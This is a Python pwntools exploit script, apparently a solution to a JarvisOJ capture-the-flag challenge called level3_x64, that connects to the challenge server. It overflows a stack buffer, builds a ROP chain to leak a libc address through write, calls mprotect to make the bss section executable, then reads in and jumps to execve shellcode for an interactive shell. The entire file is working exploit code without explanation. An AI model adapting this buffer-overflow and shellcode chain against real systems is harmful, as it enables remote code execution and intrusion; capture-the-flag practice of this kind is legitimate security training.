#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote("pwn2.jarvisoj.com", 9884)
elf = ELF('./level3_x64')
libc = ELF("./libc-2.19.so")
context.log_level = 'debug'

def main():

	write_plt = elf.symbols['write']
	write_got = elf.got['write']
	vul = elf.symbols["vulnerable_function"]
	pop_rdi = 0x00000000004006b3
	pop_rsi = 0x00000000004006b1

	###leak libc###
	payload = 'A' * 0x80 + 'deadbeef' + p64(pop_rdi) + p64(1)
	payload+= p64(pop_rsi) + p64(write_got) + 'anything'
	payload+= p64(write_plt) + p64(vul)
	p.sendafter("Input:\n", payload)
	libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.symbols['write']
	success(hex(libc.address))
	#pause()

	###mprotect to bss###
	mprotect = libc.symbols['mprotect']
	pop_rsi = libc.address + 0x24885
	pop_rdx = libc.address + 0x1b8e
	payload = 'A' * 0x80 + 'deadbeef' + p64(pop_rdi) + p64(0x00600000)
	payload+= p64(pop_rsi) + p64(0x1000)
	payload+= p64(pop_rdx) + p64(7)
	payload+= p64(mprotect) + p64(vul)
	p.sendafter("Input:\n", payload)


	###read && ret to shellcode###
	shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7'
	shellcode+= '\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
	read = libc.symbols['read']
	payload = 'A' * 0x80 + 'deadbeef' + p64(pop_rdi) + p64(0)
	payload+= p64(pop_rsi) + p64(elf.bss() + 0x500)
	payload+= p64(pop_rdx) + p64(0x100)
	payload+= p64(read) + p64(elf.bss() + 0x500)
	p.sendafter("Input:\n", payload)
	p.send(shellcode)

if __name__ == '__main__':
	main()
	p.interactive()
